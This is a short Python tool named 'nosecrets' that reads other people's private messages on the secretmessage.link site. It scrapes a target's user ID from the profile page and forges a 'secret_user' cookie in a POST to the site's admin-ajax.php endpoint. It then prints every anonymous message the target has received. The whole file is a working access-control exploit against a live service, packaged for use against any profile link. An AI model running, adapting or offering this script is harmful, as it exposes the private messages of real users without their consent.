import requests
from bs4 import BeautifulSoup

print("""

.-. .-. .----.  .----..----..---. .----. .----..---.  .----.
|  `| |/  {}  \\{ {__  | {_ /  ___}| {}  }| {_ {_   _}{ {__  
| |\\  |\\      /.-._} }| {__\\     }| .-. \\| {__  | |  .-._} }
`-' `-' `----' `----' `----'`---' `-' `-'`----' `-'  `----' 
         https://github.com/jmrcsnchz/nosecrets

""")

def main():
	link = input("Target Link: > ")
	getUID = requests.get(link)
	raw_html = getUID.text

	soup = BeautifulSoup(raw_html, 'html.parser')
	targetName = soup.title.string
	print(targetName)

	uid = soup.find(rel="shortlink").get('href')[34:]

	print(f"[+] Target UID: {uid}")
	print("Getting Messages.....")

	getMsg = requests.post('https://www.secretmessage.link//wp-admin/admin-ajax.php', cookies = {'secret_user': uid}, data = {'action':'refresh'})
	baked_html = getMsg.text

	soup1 = BeautifulSoup(baked_html, 'html.parser')
	msgRaw = soup1.find_all("p", {"class": "secret-received-message"})
	msgCount = len(msgRaw)
	print(f"[+] Discovered {msgCount} Secret Messages  ======")
	print("")

	for x in msgRaw:
		index = msgRaw.index(x) + 1
		print(f"({index}) " + x.string.strip())
	print()
	main()

main()
